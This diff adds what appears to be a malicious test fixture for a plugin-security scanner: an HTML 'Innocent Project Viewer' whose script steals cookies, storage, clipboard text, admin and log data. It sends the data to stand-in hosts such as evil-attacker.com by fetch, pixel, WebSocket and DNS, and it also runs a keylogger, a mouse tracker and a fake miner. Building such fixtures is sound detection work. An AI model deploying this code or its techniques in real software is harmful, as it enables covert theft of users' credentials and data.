@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Exfiltration Test Plugin</title>
+</head>
+<body>
+    <h1>Innocent Project Viewer</h1>
+    <p>This plugin appears to display project data but actually steals it.</p>
+    
+    <div id="projects"></div>
+    
+    <script>
+        // Hardcoded credentials (should be detected)
+        const API_KEY = "sk-1234567890abcdef1234567890abcdef";
+        const SECRET_TOKEN = "ghp_xxxxxxxxxxxxxxxxxxxx";
+        const DB_PASSWORD = "supersecretpassword123";
+        
+        console.log('Loading project data...');
+        
+        // Data exfiltration functions
+        async function stealData() {
+            const stolenData = {
+                cookies: document.cookie,
+                localStorage: Object.assign({}, localStorage),
+                sessionStorage: Object.assign({}, sessionStorage),
+                userAgent: navigator.userAgent,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                connection: navigator.connection
+            };
+            
+            // Attempt to steal crypto wallet data
+            if (window.ethereum) {
+                stolenData.ethereum = {
+                    isMetaMask: window.ethereum.isMetaMask,
+                    chainId: window.ethereum.chainId
+                };
+            }
+            
+            // Try to access clipboard
+            try {
+                const clipboardData = await navigator.clipboard.readText();
+                stolenData.clipboard = clipboardData;
+            } catch (e) {
+                console.log('Clipboard access denied');
+            }
+            
+            // Exfiltrate to attacker server (should be blocked)
+            fetch('https://evil-attacker.com/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Stolen-From': 'TaylorDash'
+                },
+                body: JSON.stringify(stolenData)
+            }).catch(() => {
+                // Fallback exfiltration method
+                const img = new Image();
+                img.src = `https://evil-attacker.com/pixel?data=${encodeURIComponent(JSON.stringify(stolenData))}`;
+            });
+            
+            // Try WebSocket exfiltration
+            try {
+                const ws = new WebSocket('wss://evil-attacker.com/ws');
+                ws.onopen = () => {
+                    ws.send(JSON.stringify(stolenData));
+                };
+            } catch (e) {
+                console.log('WebSocket blocked');
+            }
+            
+            // Try DNS exfiltration
+            const dnsData = btoa(JSON.stringify(stolenData)).replace(/[+=]/g, '');
+            const dnsImg = new Image();
+            dnsImg.src = `https://${dnsData.slice(0, 50)}.evil-dns.com/pixel.gif`;
+        }
+        
+        // Load legitimate project data but steal everything else
+        async function loadProjects() {
+            try {
+                // Legitimate API call
+                const response = await fetch('/api/v1/projects');
+                const projects = await response.json();
+                
+                // Display projects normally
+                const projectsDiv = document.getElementById('projects');
+                projectsDiv.innerHTML = projects.map(p => `<div>${p.name}</div>`).join('');
+                
+                // But also steal the project data
+                fetch('https://data-thief.com/projects', {
+                    method: 'POST',
+                    body: JSON.stringify(projects)
+                });
+                
+                // Steal additional API data
+                const adminResponse = await fetch('/api/v1/admin/users');
+                if (adminResponse.ok) {
+                    const adminData = await adminResponse.json();
+                    fetch('https://data-thief.com/admin', {
+                        method: 'POST',
+                        body: JSON.stringify(adminData)
+                    });
+                }
+                
+                // Try to access logs (permission escalation)
+                const logsResponse = await fetch('/api/v1/logs');
+                if (logsResponse.ok) {
+                    const logs = await logsResponse.json();
+                    fetch('https://data-thief.com/logs', {
+                        method: 'POST',
+                        body: JSON.stringify(logs)
+                    });
+                }
+                
+            } catch (error) {
+                console.error('Error loading projects:', error);
+            }
+        }
+        
+        // Delayed exfiltration to avoid detection
+        setTimeout(stealData, 3000);
+        setTimeout(loadProjects, 1000);
+        
+        // Keylogger
+        document.addEventListener('keydown', function(event) {
+            fetch('https://keylogger.evil.com/keys', {
+                method: 'POST',
+                body: JSON.stringify({
+                    key: event.key,
+                    timestamp: Date.now(),
+                    url: window.location.href
+                })
+            });
+        });
+        
+        // Mouse tracker
+        document.addEventListener('mousemove', function(event) {
+            if (Math.random() < 0.01) { // Only send 1% of mouse moves
+                fetch('https://tracker.evil.com/mouse', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        x: event.clientX,
+                        y: event.clientY,
+                        timestamp: Date.now()
+                    })
+                });
+            }
+        });
+        
+        // Cryptocurrency mining (resource abuse)
+        function startMining() {
+            let hashCount = 0;
+            const minerWorker = () => {
+                let hash = 0;
+                for (let i = 0; i < 1000000; i++) {
+                    hash = (hash * 31 + Math.random()) % 1000000;
+                }
+                hashCount++;
+                if (hashCount % 1000 === 0) {
+                    fetch('https://crypto-miner.com/submit', {
+                        method: 'POST',
+                        body: JSON.stringify({ hashes: hashCount })
+                    });
+                }
+                setTimeout(minerWorker, 1);
+            };
+            minerWorker();
+        }
+        
+        setTimeout(startMining, 5000);
+    </script>
+</body>
+</html>
